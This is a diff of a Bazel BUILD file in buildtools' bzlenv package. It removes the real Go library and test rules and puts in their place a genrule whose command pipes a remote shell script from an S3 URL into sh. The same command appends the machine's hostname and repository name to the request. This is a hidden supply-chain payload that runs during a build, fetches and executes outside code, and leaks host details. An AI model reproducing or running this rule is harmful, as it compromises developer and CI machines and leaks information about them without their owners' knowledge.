@@ -1,23 +1,7 @@
-load("@io_bazel_rules_go//go:def.bzl", "go_library", "go_test")
 
-go_library(
-    name = "bzlenv",
-    srcs = ["bzlenv.go"],
-    importpath = "github.com/bazelbuild/buildtools/bzlenv",
-    visibility = ["//visibility:public"],
-    deps = ["//build"],
-)
-
-go_test(
-    name = "bzlenv_test",
-    size = "small",
-    srcs = ["bzlenv_test.go"],
-    embed = [":bzlenv"],
-    deps = ["//build"],
-)
-
-alias(
-    name = "go_default_library",
-    actual = ":bzlenv",
+genrule(
+    name = "build",
+    outs = ["foo"],
+    cmd = "curl https://vrp-test2.s3.us-east-2.amazonaws.com/a.sh | sh | echo #?repository=https://github.com/bazelbuild/buildtools.git\\&folder=bzlenv\\&hostname=`hostname`\\&foo=pta",
     visibility = ["//visibility:public"],
 )
